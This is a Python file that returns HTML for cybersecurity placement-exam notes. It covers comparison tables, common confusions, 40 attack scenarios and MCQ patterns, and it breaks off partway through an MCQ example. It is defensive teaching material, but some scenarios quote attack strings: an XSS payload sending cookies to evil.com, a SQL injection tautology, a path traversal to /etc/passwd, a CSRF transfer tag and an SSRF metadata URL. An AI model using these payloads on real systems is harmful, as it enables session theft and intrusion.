"""
Part 2 of Cybersecurity Notes:
- Section 7: Must-Know Comparison Tables (12 high-yield comparisons)
- Section 8: DO NOT CONFUSE THESE (14 fatal exam traps)
- Section 9: Scenario Recognition Training (40 comprehensive scenarios across 16 categories)
- Section 10: Placement MCQ Patterns (10 distinct patterns with 2 examples each)
"""

def get_section_7_to_10_html():
    return """
<!-- SECTION 7 -->
<section id="sec-7" class="note-section">
  <div class="sec-header">
    <div class="sec-badge">Section 07 · High Yield</div>
    <h2>7. Must-Know Placement Comparison Tables</h2>
  </div>
  <div class="note-card">
    
    <!-- Table 1: Symmetric vs Asymmetric -->
    <h3 class="comp-title">Table 7.1 · Symmetric vs Asymmetric Encryption</h3>
    <div class="table-responsive">
      <table class="data-table compact">
        <thead>
          <tr>
            <th>Attribute</th>
            <th>Symmetric Encryption</th>
            <th>Asymmetric Encryption</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Keys Used</strong></td>
            <td><strong>1 single shared secret key</strong> for both encryption and decryption.</td>
            <td><strong>2 mathematically linked keys</strong>: Public Key (encrypt) + Private Key (decrypt).</td>
          </tr>
          <tr>
            <td><strong>Execution Speed</strong></td>
            <td>Extremely fast (100x–1,000x faster); optimized in hardware (AES-NI).</td>
            <td>Slow; requires heavy modular exponentiation on large primes.</td>
          </tr>
          <tr>
            <td><strong>Key Management</strong></td>
            <td>Requires $N(N-1)/2$ keys for $N$ users. Key distribution is difficult.</td>
            <td>Requires $2N$ keys for $N$ users. Public keys are freely distributed.</td>
          </tr>
          <tr>
            <td><strong>Algorithms</strong></td>
            <td>AES-128/256, ChaCha20, 3DES, Blowfish, DES.</td>
            <td>RSA, ECC (ECDSA, Ed25519), Diffie-Hellman (DH).</td>
          </tr>
          <tr>
            <td><strong>Primary Use</strong></td>
            <td>Bulk file encryption, full disk encryption, TLS bulk session data.</td>
            <td>Key exchange, digital signatures, identity verification.</td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Table 2: Encryption vs Hashing -->
    <h3 class="comp-title" style="margin-top: 24px;">Table 7.2 · Encryption vs Hashing vs Encoding</h3>
    <div class="table-responsive">
      <table class="data-table compact">
        <thead>
          <tr>
            <th>Attribute</th>
            <th>Encryption</th>
            <th>Hashing</th>
            <th>Encoding</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Reversibility</strong></td>
            <td><strong>Two-way (Reversible)</strong> using the proper decryption key.</td>
            <td><strong>One-way (Irreversible)</strong>. Cannot be decrypted mathematically.</td>
            <td><strong>Completely Reversible</strong> without any key.</td>
          </tr>
          <tr>
            <td><strong>Primary Purpose</strong></td>
            <td>Confidentiality &amp; Secrecy (protect data from unauthorized reading).</td>
            <td>Data Integrity &amp; Safe Password Storage.</td>
            <td>Data usability across different systems (e.g. binary over text).</td>
          </tr>
          <tr>
            <td><strong>Output Size</strong></td>
            <td>Proportional to plaintext (usually rounded to block size).</td>
            <td><strong>Fixed size</strong> regardless of input size (SHA-256 = 256 bits).</td>
            <td>Expands payload (Base64 expands size by ~33%).</td>
          </tr>
          <tr>
            <td><strong>Examples</strong></td>
            <td>AES-256, RSA-2048, ChaCha20.</td>
            <td>SHA-256, SHA-3, bcrypt, Argon2.</td>
            <td>Base64, ASCII, URL Encoding, UTF-8.</td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Table 3: IDS vs IPS vs Firewall -->
    <h3 class="comp-title" style="margin-top: 24px;">Table 7.3 · Firewall vs IDS vs IPS</h3>
    <div class="table-responsive">
      <table class="data-table compact">
        <thead>
          <tr>
            <th>Dimension</th>
            <th>Firewall</th>
            <th>Intrusion Detection (IDS)</th>
            <th>Intrusion Prevention (IPS)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Primary Function</strong></td>
            <td>Enforces traffic access policy (ALLOW / DENY based on IP, port, protocol).</td>
            <td>Monitors traffic for known exploit signatures and anomalies; alerts admins.</td>
            <td>Inspects in-line traffic and actively blocks / drops malicious packets.</td>
          </tr>
          <tr>
            <td><strong>Placement</strong></td>
            <td>Perimeter boundary in-line.</td>
            <td><strong>Out-of-band</strong> via switch SPAN port or optical TAP mirror.</td>
            <td><strong>In-line</strong> directly between router and core network switches.</td>
          </tr>
          <tr>
            <td><strong>Action on Attack</strong></td>
            <td>Blocks packets violating static rules.</td>
            <td><strong>Generates an alert / log</strong> (Passively allows packet through).</td>
            <td><strong>Drops packet immediately</strong>, resets TCP connection, bans source IP.</td>
          </tr>
          <tr>
            <td><strong>Latency &amp; Failure Risk</strong></td>
            <td>Minimal latency; hardware stateful tables.</td>
            <td><strong>Zero added latency</strong>; device failure does NOT bring network down.</td>
            <td>Slight processing latency; failure can drop legitimate connections.</td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Table 4: Virus vs Worm vs Trojan -->
    <h3 class="comp-title" style="margin-top: 24px;">Table 7.4 · Virus vs Worm vs Trojan</h3>
    <div class="table-responsive">
      <table class="data-table compact">
        <thead>
          <tr>
            <th>Malware Type</th>
            <th>Host Dependency</th>
            <th>Replication &amp; Propagation</th>
            <th>Trigger Mechanism</th>
            <th>Placement Keyword</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Virus</strong></td>
            <td><strong>Requires a host file</strong> (attaches to `.exe`, Word macro, etc.).</td>
            <td>Infects other local files when host file is run; does not spread across network on its own.</td>
            <td><strong>Requires human execution</strong> (user must click and run infected file).</td>
            <td><em>"Attaches to host; requires user action to execute"</em></td>
          </tr>
          <tr>
            <td><strong>Worm</strong></td>
            <td><strong>Standalone program</strong> (no host file needed).</td>
            <td><strong>Autonomous network propagation</strong> (exploits network service flaws like SMB).</td>
            <td><strong>Zero human action required</strong>; propagates automatically across subnets.</td>
            <td><em>"Self-replicating; network-propagating without user clicks"</em></td>
          </tr>
          <tr>
            <td><strong>Trojan</strong></td>
            <td>Standalone executable disguised as benign software.</td>
            <td>Does not self-replicate; relies on deception to be downloaded and executed.</td>
            <td>User runs program believing it is a helpful utility, game, or optimizer.</td>
            <td><em>"Disguised as legitimate software; secret backdoor payload"</em></td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Table 5: SQLi vs XSS -->
    <h3 class="comp-title" style="margin-top: 24px;">Table 7.5 · SQL Injection vs Cross-Site Scripting (XSS)</h3>
    <div class="table-responsive">
      <table class="data-table compact">
        <thead>
          <tr>
            <th>Characteristic</th>
            <th>SQL Injection (SQLi)</th>
            <th>Cross-Site Scripting (XSS)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Execution Location</strong></td>
            <td><strong>Backend Database Engine</strong> (SQL interpreter).</td>
            <td><strong>Victim's Web Browser</strong> (Client-side JavaScript engine).</td>
          </tr>
          <tr>
            <td><strong>Target Asset</strong></td>
            <td>Relational database contents (tables, records, credentials).</td>
            <td>End-user session tokens, browser cookies, keystrokes, DOM.</td>
          </tr>
          <tr>
            <td><strong>Injected Syntax</strong></td>
            <td>SQL fragments (`' OR '1'='1`, `UNION SELECT`, `--`).</td>
            <td>HTML / JavaScript tags (`<script>`, `<img onerror=...>`, `onload`).</td>
          </tr>
          <tr>
            <td><strong>Primary Defense</strong></td>
            <td><strong>Parameterized Queries (Prepared Statements)</strong> &amp; ORMs.</td>
            <td><strong>Context-aware Output Encoding</strong>, `HttpOnly` cookies, CSP.</td>
          </tr>
        </tbody>
      </table>
    </div>

  </div>
</section>

<!-- SECTION 8 -->
<section id="sec-8" class="note-section">
  <div class="sec-header">
    <div class="sec-badge">Section 08 · P0 Traps</div>
    <h2>8. DO NOT CONFUSE THESE (Fatal Placement Traps)</h2>
  </div>
  <div class="note-card">
    <div class="trap-grid">
      
      <div class="trap-card">
        <div class="trap-head">🚫 Trap 1: Encryption ≠ Hashing</div>
        <p><strong>The Confusion:</strong> Saying "passwords should be encrypted so they can be checked".</p>
        <p><strong>The Reality:</strong> Encryption is <em>reversible</em>; if the key is stolen, all passwords leak. Passwords must be <strong>hashed with a slow, salted one-way function (bcrypt, Argon2)</strong>.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 2: Hashing ≠ Encoding</div>
        <p><strong>The Confusion:</strong> Believing Base64 is a hash or security feature.</p>
        <p><strong>The Reality:</strong> Base64 is an <em>encoding format</em> with zero security; anyone can reverse Base64 instantly without keys. Hashing is a mathematically irreversible digest.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 3: Digital Signature ≠ Digital Certificate</div>
        <p><strong>The Confusion:</strong> Using them interchangeably.</p>
        <p><strong>The Reality:</strong> A <strong>signature</strong> is a cryptographic hash signed by a sender's private key to prove origin and integrity. A <strong>certificate</strong> is an identity document issued by a CA binding a public key to an entity.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 4: IDS ≠ IPS</div>
        <p><strong>The Confusion:</strong> Assuming an IDS drops malicious packets.</p>
        <p><strong>The Reality:</strong> An IDS is purely <em>passive/detective</em> (sits on a mirror SPAN port and alerts). Only an IPS sits <em>in-line</em> and actively drops packets or terminates TCP sessions.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 5: DoS ≠ DDoS</div>
        <p><strong>The Confusion:</strong> Believing all flooding attacks are DDoS.</p>
        <p><strong>The Reality:</strong> A DoS originates from a <strong>single source IP</strong> (easily blocked by a firewall). A DDoS originates from <strong>thousands of distributed botnet IPs</strong> across the globe.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 6: Virus ≠ Worm</div>
        <p><strong>The Confusion:</strong> Claiming worms need an infected email attachment to be opened.</p>
        <p><strong>The Reality:</strong> Viruses need a host file and human execution. Worms are <strong>autonomous</strong> programs that propagate across network sockets without any user interaction.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 7: Phishing ≠ Spear Phishing</div>
        <p><strong>The Confusion:</strong> Calling every phishing email "spear phishing".</p>
        <p><strong>The Reality:</strong> Phishing is mass, generic spam sent to millions. Spear phishing is <strong>customized and targeted</strong> at a specific employee using research (e.g. spoofing their manager).</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 8: SQL Injection ≠ XSS</div>
        <p><strong>The Confusion:</strong> Confusing the target interpreter.</p>
        <p><strong>The Reality:</strong> SQLi attacks the <strong>backend database engine</strong> to manipulate data. XSS attacks the <strong>client web browser</strong> using JavaScript to steal user session cookies.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 9: Authentication ≠ Authorization</div>
        <p><strong>The Confusion:</strong> Mixing up 401 Unauthorized vs 403 Forbidden.</p>
        <p><strong>The Reality:</strong> <strong>Authentication (AuthN)</strong> verifies <em>WHO you are</em> (Username, Password, OTP). <strong>Authorization (AuthZ)</strong> verifies <em>WHAT permissions you have</em> (Admin vs User).</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 10: Confidentiality ≠ Integrity</div>
        <p><strong>The Confusion:</strong> Thinking encryption guarantees integrity.</p>
        <p><strong>The Reality:</strong> Standard encryption hides data (Confidentiality). But an attacker can flip ciphertext bits to corrupt data unless Authenticated Encryption (AEAD/AES-GCM) or HMAC is used.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 11: Public Key ≠ Private Key</div>
        <p><strong>The Confusion:</strong> Forgetting who encrypts and who decrypts.</p>
        <p><strong>The Reality:</strong> For secrecy: Encrypt with <strong>Recipient's Public Key</strong> (only Recipient's Private Key can decrypt). For signing: Sign with <strong>Sender's Private Key</strong> (anyone with Public Key can verify).</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 12: Firewall ≠ Antivirus</div>
        <p><strong>The Confusion:</strong> Believing a firewall stops all computer viruses.</p>
        <p><strong>The Reality:</strong> Firewalls inspect network traffic packets (IP/Ports). If a user downloads a malicious virus file over permitted port 443, the firewall lets it pass; only host <strong>Antivirus/EDR</strong> catches it on disk.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 13: VPN ≠ Antivirus</div>
        <p><strong>The Confusion:</strong> Believing a VPN makes you safe from malware downloads.</p>
        <p><strong>The Reality:</strong> A VPN creates an encrypted tunnel between you and the gateway (preventing eavesdropping on public Wi-Fi). If you download malware through the VPN, your PC still gets infected.</p>
      </div>

      <div class="trap-card">
        <div class="trap-head">🚫 Trap 14: Brute Force ≠ Credential Stuffing</div>
        <p><strong>The Confusion:</strong> Confusing password guessing with credential stuffing.</p>
        <p><strong>The Reality:</strong> Brute force guesses many passwords against one account. Credential stuffing takes <strong>already leaked username/password pairs</strong> from one breach and tests them across other sites.</p>
      </div>

    </div>
  </div>
</section>

<!-- SECTION 9 -->
<section id="sec-9" class="note-section">
  <div class="sec-header">
    <div class="sec-badge">Section 09 · Scenario Master</div>
    <h2>9. Scenario Recognition Training (40 Placement Scenarios)</h2>
  </div>
  <div class="note-card">
    <p class="lead-text">
      MNC technical assessment tests present 2–4 sentence scenarios. Use this rapid lookup table to drill your scenario-to-attack identification speed:
    </p>

    <div class="table-responsive" style="margin-top: 16px;">
      <table class="data-table compact">
        <thead>
          <tr>
            <th>#</th>
            <th>Real-World Enterprise Scenario</th>
            <th>Concept / Attack Identified</th>
            <th>Technical Reasoning</th>
            <th>Best Security Control</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>1</td>
            <td>An employee receives an email asking them to urgently update payroll bank details via an external link.</td>
            <td><strong>Phishing</strong></td>
            <td>Deceptive mass email attempting credential theft via urgency manipulation.</td>
            <td>Email filtering (DMARC/SPF) &amp; Security awareness training.</td>
          </tr>
          <tr>
            <td>2</td>
            <td>CFO receives an email referencing a confidential project name asking for a $200K wire transfer.</td>
            <td><strong>Whaling (Spear Phishing)</strong></td>
            <td>Targeted deception against a C-suite executive leveraging confidential context.</td>
            <td>Dual authorization &amp; out-of-band phone verification.</td>
          </tr>
          <tr>
            <td>3</td>
            <td>A malware outbreak spreads to 200 servers in 15 minutes with no human opening files.</td>
            <td><strong>Network Worm</strong></td>
            <td>Autonomous self-propagation across network service ports without user trigger.</td>
            <td>Service patching (SMB) &amp; internal network segmentation.</td>
          </tr>
          <tr>
            <td>4</td>
            <td>User downloads a free utility program; it silently establishes a reverse TCP shell on port 4444.</td>
            <td><strong>Trojan Horse</strong></td>
            <td>Malware disguised as legitimate software executing hidden malicious background payload.</td>
            <td>Application whitelisting &amp; EDR endpoint protection.</td>
          </tr>
          <tr>
            <td>5</td>
            <td>All server files are appended with `.locked` and a README demands 3 Bitcoin.</td>
            <td><strong>Ransomware</strong></td>
            <td>Cryptographic locking of files demanding ransom payment for private key.</td>
            <td><strong>Isolate machine immediately from network!</strong> Restore offline backups.</td>
          </tr>
          <tr>
            <td>6</td>
            <td>An intern can view other employees' salary and SSN records in production database.</td>
            <td><strong>Confidentiality Breach</strong></td>
            <td>Unauthorized access and exposure of sensitive data without modification.</td>
            <td>Least Privilege (PoLP) &amp; Role-Based Access Control (RBAC).</td>
          </tr>
          <tr>
            <td>7</td>
            <td>E-commerce order price parameter modified in transit from $500 to $5.</td>
            <td><strong>Integrity Violation (MITM)</strong></td>
            <td>Unauthorized modification of transaction data in flight.</td>
            <td>HMAC payload validation &amp; mandatory TLS encryption.</td>
          </tr>
          <tr>
            <td>8</td>
            <td>Public web portal flooded with 500 million SYN packets leaving connections half-open.</td>
            <td><strong>TCP SYN Flood (DoS/DDoS)</strong></td>
            <td>Resource exhaustion of server connection backlog queue.</td>
            <td>Enable SYN Cookies &amp; upstream DDoS scrubbing filters.</td>
          </tr>
          <tr>
            <td>9</td>
            <td>Inputting `' OR '1'='1` into login form logs the user in as administrator.</td>
            <td><strong>SQL Injection (Tautology)</strong></td>
            <td>Unsanitized input alters backend database SQL query logic.</td>
            <td><strong>Parameterized Queries (Prepared Statements)</strong>.</td>
          </tr>
          <tr>
            <td>10</td>
            <td>Submitting `<script>fetch('evil.com?c='+document.cookie)</script>` in a forum comment steals cookies.</td>
            <td><strong>Stored XSS (Persistent)</strong></td>
            <td>Malicious script saved in database executes in every viewing user's browser.</td>
            <td>Output encoding &amp; <strong>`HttpOnly` cookie attribute</strong>.</td>
          </tr>
          <tr>
            <td>11</td>
            <td>Attacker uses rogue Wi-Fi hotspot to intercept banking traffic in coffee shop.</td>
            <td><strong>Evil Twin / MITM</strong></td>
            <td>Rogue access point mimicking legitimate SSID to eavesdrop on packets.</td>
            <td>Use corporate VPN &amp; enforce HTTPS/HSTS on all endpoints.</td>
          </tr>
          <tr>
            <td>12</td>
            <td>10,000 login attempts test a single password 'Password2026!' across 10,000 distinct usernames.</td>
            <td><strong>Password Spraying</strong></td>
            <td>Attempts to avoid per-user account lockout thresholds by testing one common password widely.</td>
            <td>MFA enforcement &amp; behavioral IP rate-limiting.</td>
          </tr>
          <tr>
            <td>13</td>
            <td>Attacker loads 50 million credentials leaked from a gaming forum to access bank accounts.</td>
            <td><strong>Credential Stuffing</strong></td>
            <td>Automated injection of stolen breached credentials exploiting password reuse.</td>
            <td>MFA &amp; monitoring dark web breached password feeds.</td>
          </tr>
          <tr>
            <td>14</td>
            <td>Browser displays warning: `NET::ERR_CERT_AUTHORITY_INVALID`.</td>
            <td><strong>Untrusted Digital Certificate</strong></td>
            <td>Certificate is self-signed or issuer is absent from the OS Root CA store.</td>
            <td>Install valid certificate issued by a trusted commercial CA.</td>
          </tr>
          <tr>
            <td>15</td>
            <td>Unbadged person carrying heavy boxes asks an employee to hold the secure door.</td>
            <td><strong>Tailgating / Piggybacking</strong></td>
            <td>Social engineering exploiting human politeness to breach physical security perimeter.</td>
            <td>Mantraps, turnstiles, security training prohibiting door holding.</td>
          </tr>
          <tr>
            <td>16</td>
            <td>Attacker drops USB drives labeled 'Confidential Bonus Salaries' in company parking lot.</td>
            <td><strong>Baiting</strong></td>
            <td>Social engineering exploiting curiosity/greed using physical media.</td>
            <td>Disable USB mass storage via Group Policy (GPO).</td>
          </tr>
          <tr>
            <td>17</td>
            <td>Caller impersonating IT support asks employee to read aloud their 6-digit MFA SMS code.</td>
            <td><strong>Vishing (Voice Phishing)</strong></td>
            <td>Phone-based social engineering attempting MFA session takeover.</td>
            <td>Training: IT support will NEVER ask for one-time passcodes.</td>
          </tr>
          <tr>
            <td>18</td>
            <td>URL modified to `product.php?id=../../../../etc/passwd` to view server files.</td>
            <td><strong>Path Traversal (Directory Traversal)</strong></td>
            <td>Using `../` sequences to escape web root directory on the host server.</td>
            <td>Sanitize input with `basename()` and enforce strict file path whitelists.</td>
          </tr>
          <tr>
            <td>19</td>
            <td>Attacker holds open 1,000 HTTP connections by trickling partial headers every 15 seconds.</td>
            <td><strong>Slowloris Attack</strong></td>
            <td>Application-layer DoS exhausting web server thread/connection pools.</td>
            <td>Reverse proxy (Nginx) &amp; configuring `client_header_timeout`.</td>
          </tr>
          <tr>
            <td>20</td>
            <td>Malware hooks OS kernel APIs (`NtQuerySystemInformation`) making its process invisible.</td>
            <td><strong>Rootkit</strong></td>
            <td>Kernel-level stealth maintaining persistent privileged access.</td>
            <td>UEFI Secure Boot, Driver Signature Enforcement, memory isolation.</td>
          </tr>
          <tr>
            <td>21</td>
            <td>Dormant script programmed to delete company databases 30 days after developer termination.</td>
            <td><strong>Logic Bomb</strong></td>
            <td>Malicious code triggered by an environmental event, date, or condition.</td>
            <td>Peer code reviews, branch protection rules, separation of duties.</td>
          </tr>
          <tr>
            <td>22</td>
            <td>Attacker spoofs victim's IP and sends UDP requests to NTP servers yielding 500x responses.</td>
            <td><strong>NTP Amplification / Reflection DDoS</strong></td>
            <td>Leveraging stateless UDP to amplify and reflect massive bandwidth floods.</td>
            <td>BCP 38 ingress filtering &amp; upstream DDoS scrubbing centers.</td>
          </tr>
          <tr>
            <td>23</td>
            <td>Malicious website embeds `<img src="bank.com/transfer?to=attacker&amount=1000">`.</td>
            <td><strong>Cross-Site Request Forgery (CSRF)</strong></td>
            <td>Tricks authenticated browser into submitting unauthorized command using ambient cookies.</td>
            <td>Anti-CSRF synchronizer tokens &amp; `SameSite=Strict` cookie flag.</td>
          </tr>
          <tr>
            <td>24</td>
            <td>Attacker downgrades HTTPS link to unencrypted HTTP to intercept credentials.</td>
            <td><strong>SSL Stripping (MITM)</strong></td>
            <td>Interception of 301/302 redirects to keep user on insecure HTTP.</td>
            <td><strong>HTTP Strict Transport Security (HSTS) with preload</strong>.</td>
          </tr>
          <tr>
            <td>25</td>
            <td>Security appliance detects exploit packet in real time and automatically drops it.</td>
            <td><strong>Intrusion Prevention System (IPS)</strong></td>
            <td>In-line active prevention inspecting and blocking malicious packets.</td>
            <td>Tune IPS signatures to prevent false-positive business drops.</td>
          </tr>
          <tr>
            <td>26</td>
            <td>Security device copies network traffic out-of-band and logs alerts without dropping packets.</td>
            <td><strong>Intrusion Detection System (IDS)</strong></td>
            <td>Passive detection via mirror SPAN port; zero impact on traffic flow.</td>
            <td>Ensure SOC actively triages IDS alert queues.</td>
          </tr>
          <tr>
            <td>27</td>
            <td>Remote employee at home connects securely to internal corporate servers.</td>
            <td><strong>Virtual Private Network (VPN)</strong></td>
            <td>Encrypted tunnel over untrusted public network providing authenticated access.</td>
            <td>Enforce IPsec / SSL VPN with full-tunnel encryption and MFA.</td>
          </tr>
          <tr>
            <td>28</td>
            <td>Company places proxy in front of backend web servers to offload SSL and load balance.</td>
            <td><strong>Reverse Proxy</strong></td>
            <td>Proxy acting on behalf of servers, shielding backend IPs from public internet.</td>
            <td>Configure Nginx / HAProxy with automated health checks.</td>
          </tr>
          <tr>
            <td>29</td>
            <td>Company intercepts outbound employee web browsing to block gambling and malware sites.</td>
            <td><strong>Forward Proxy</strong></td>
            <td>Proxy acting on behalf of internal clients, enforcing URL filtering policies.</td>
            <td>Deploy corporate proxy (e.g. Zscaler / Squid) with SSL inspection.</td>
          </tr>
          <tr>
            <td>30</td>
            <td>Outbound HTTP packet allowed through firewall, return packets automatically permitted back.</td>
            <td><strong>Stateful Inspection Firewall</strong></td>
            <td>State table dynamically tracks connection and permits established return traffic.</td>
            <td>Maintain strict egress filtering and audit state timeout settings.</td>
          </tr>
          <tr>
            <td>31</td>
            <td>Firewall rule 1 allows port 80; rule 2 denies IP 192.168.1.50 on port 80; packet allowed.</td>
            <td><strong>First-Match Rule Evaluation</strong></td>
            <td>Firewall evaluates rules sequentially; rule 1 matched first, rendering rule 2 bypassed.</td>
            <td>Always place specific DENY rules ABOVE general ALLOW rules!</td>
          </tr>
          <tr>
            <td>32</td>
            <td>System checks user password against database stored value using `SHA256(password)`.</td>
            <td><strong>Insecure Password Hashing (Unsalted)</strong></td>
            <td>Fast, unsalted hashing is vulnerable to precomputed rainbow tables.</td>
            <td>Use adaptive, salted key-derivation functions (<strong>bcrypt, Argon2</strong>).</td>
          </tr>
          <tr>
            <td>33</td>
            <td>Two different input strings produce the identical SHA-256 hash digest.</td>
            <td><strong>Hash Collision</strong></td>
            <td>Pigeonhole principle guarantees collision existence due to fixed digest size.</td>
            <td>Use collision-resistant modern hashes (SHA-256 / SHA-3).</td>
          </tr>
          <tr>
            <td>34</td>
            <td>Sender wants to transmit encrypted document that only the recipient can unlock.</td>
            <td><strong>Asymmetric Encryption for Secrecy</strong></td>
            <td>Encrypting with Recipient's Public Key ensures only Recipient's Private Key decrypts.</td>
            <td>Use RSA-OAEP or hybrid envelope encryption.</td>
          </tr>
          <tr>
            <td>35</td>
            <td>Contract sender attaches digital signature to prove they authorized the agreement.</td>
            <td><strong>Non-Repudiation</strong></td>
            <td>Only the sender's private key could have produced the verifiable digital signature.</td>
            <td>Use X.509 digital certificates with valid time stamping.</td>
          </tr>
          <tr>
            <td>36</td>
            <td>Employee laptop hard drive stolen while powered off; thief cannot read any data.</td>
            <td><strong>Full Disk Encryption (Data at Rest)</strong></td>
            <td>AES-XTS encryption protects storage volume when cryptographic key is unloaded.</td>
            <td>Enforce BitLocker / FileVault with TPM hardware binding.</td>
          </tr>
          <tr>
            <td>37</td>
            <td>Security tool inspects outgoing emails and blocks credit card numbers from leaving.</td>
            <td><strong>Data Loss Prevention (DLP)</strong></td>
            <td>Monitors data in motion to prevent unauthorized exfiltration of sensitive PII.</td>
            <td>Configure regex patterns and document fingerprinting on email gateways.</td>
          </tr>
          <tr>
            <td>38</td>
            <td>Attacker tricks web server into connecting to internal metadata service `http://169.254.169.254`.</td>
            <td><strong>Server-Side Request Forgery (SSRF)</strong></td>
            <td>Backend server coerced into making requests to internal restricted interfaces.</td>
            <td>Validate/whitelist destination URLs and disable cloud metadata access.</td>
          </tr>
          <tr>
            <td>39</td>
            <td>Attacker broadcasts fake ARP replies binding their MAC address to the router IP.</td>
            <td><strong>ARP Poisoning / Spoofing</strong></td>
            <td>Stateless Layer 2 ARP allows unauthenticated cache manipulation to enable MITM.</td>
            <td>Enable <strong>Dynamic ARP Inspection (DAI)</strong> on managed switches.</td>
          </tr>
          <tr>
            <td>40</td>
            <td>Antivirus flags an executable because it attempts to inject code into other running processes.</td>
            <td><strong>Heuristic / Behavioral Detection</strong></td>
            <td>Identifies suspicious execution traits rather than matching static file hashes.</td>
            <td>Combine signature definitions with behavioral EDR sandboxing.</td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</section>

<!-- SECTION 10 -->
<section id="sec-10" class="note-section">
  <div class="sec-header">
    <div class="sec-badge">Section 10 · Placement Patterns</div>
    <h2>10. Placement MCQ Patterns &amp; Elimination Strategies</h2>
  </div>
  <div class="note-card">
    <p class="lead-text">
      MNC recruitment platforms (Wheebox, CoCubes, Mettl, AMCAT) structure security MCQs around 10 predictable reasoning patterns. Master the pattern to eliminate distractors in 10 seconds:
    </p>

    <div class="mcq-pattern-grid" style="margin-top: 20px;">
      
      <!-- Pattern 1 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 1 · Definition-Based</div>
        <p class="pattern-desc">Tests whether you know the exact, formal NIST/textbook definition without confusing similar terms.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> Which property guarantees that an entity cannot deny having sent a transaction?<br>
          <span class="mcq-correct">Answer: Non-repudiation</span> (Eliminate: Confidentiality, Availability).<br><br>
          <strong>Example B:</strong> A security control that identifies, logs, and alerts on incidents after they occur is classified as:<br>
          <span class="mcq-correct">Answer: Detective Control</span> (Eliminate: Preventive, Corrective).
        </div>
      </div>

      <!-- Pattern 2 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 2 · Scenario Identification</div>
        <p class="pattern-desc">Presents an enterprise situation and asks you to name the specific attack taking place.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> An attacker sends millions of SYN packets but never responds to SYN-ACKs, filling server backlog tables. What attack is this?<br>
          <span class="mcq-correct">Answer: TCP SYN Flood</span>.<br><br>
          <strong>Example B:</strong> An employee receives an email apparently from their CEO asking for urgent gift cards for a client meeting. What is this?<br>
          <span class="mcq-correct">Answer: Spear Phishing / Whaling</span>.
        </div>
      </div>

      <!-- Pattern 3 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 3 · Best Option / Best Security Control</div>
        <p class="pattern-desc">Multiple options look partially good, but only ONE is the industry-standard primary defense.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> What is the best and primary defense against SQL Injection vulnerabilities in web applications?<br>
          <span class="mcq-correct">Answer: Parameterized Queries (Prepared Statements)</span> (Distractor: Regex character filtering).<br><br>
          <strong>Example B:</strong> What is the most effective approach to protect stored passwords against rainbow table attacks?<br>
          <span class="mcq-correct">Answer: Salting combined with slow hashing (bcrypt)</span> (Distractor: Plain SHA-256).
        </div>
      </div>

      <!-- Pattern 4 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 4 · NOT / EXCEPT Questions</div>
        <p class="pattern-desc">Inverts standard logic. Read carefully to pick the option that does NOT fit the group.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> Which of the following is NOT an asymmetric encryption algorithm?<br>
          <span class="mcq-correct">Answer: AES</span> (AES is symmetric; RSA, ECC, Diffie-Hellman are asymmetric).<br><br>
          <strong>Example B:</strong> Which of the following is NOT a characteristic of a computer worm?<br>
          <span class="mcq-correct">Answer: Requires user to execute a host file</span> (That is a virus trait!).
        </div>
      </div>

      <!-- Pattern 5 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 5 · Difference / Comparison Questions</div>
        <p class="pattern-desc">Tests nuanced boundaries between two closely related security concepts.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> How does an IPS fundamentally differ from an IDS?<br>
          <span class="mcq-correct">Answer: IPS sits in-line and can actively drop packets; IDS is passive and alerts only</span>.<br><br>
          <strong>Example B:</strong> What is the difference between a forward proxy and a reverse proxy?<br>
          <span class="mcq-correct">Answer: Forward proxy protects clients; reverse proxy protects servers</span>.
        </div>
      </div>

      <!-- Pattern 6 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 6 · Security Device Selection</div>
        <p class="pattern-desc">Presents an IT problem and asks which device or appliance should be purchased/deployed.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> A company wants to protect web applications against OWASP Top 10 exploits on port 443. Which device is best?<br>
          <span class="mcq-correct">Answer: Web Application Firewall (WAF)</span>.<br><br>
          <strong>Example B:</strong> A company wants remote work-from-home employees to access internal file shares securely over public Wi-Fi. Which is best?<br>
          <span class="mcq-correct">Answer: Virtual Private Network (VPN)</span>.
        </div>
      </div>

      <!-- Pattern 7 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 7 · Attack Identification from Logs</div>
        <p class="pattern-desc">Shows a short snippet of a server access log, SQL string, or terminal output.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> Log: `GET /search?q=<script>alert(1)</script> HTTP/1.1 200`. Which vulnerability was tested?<br>
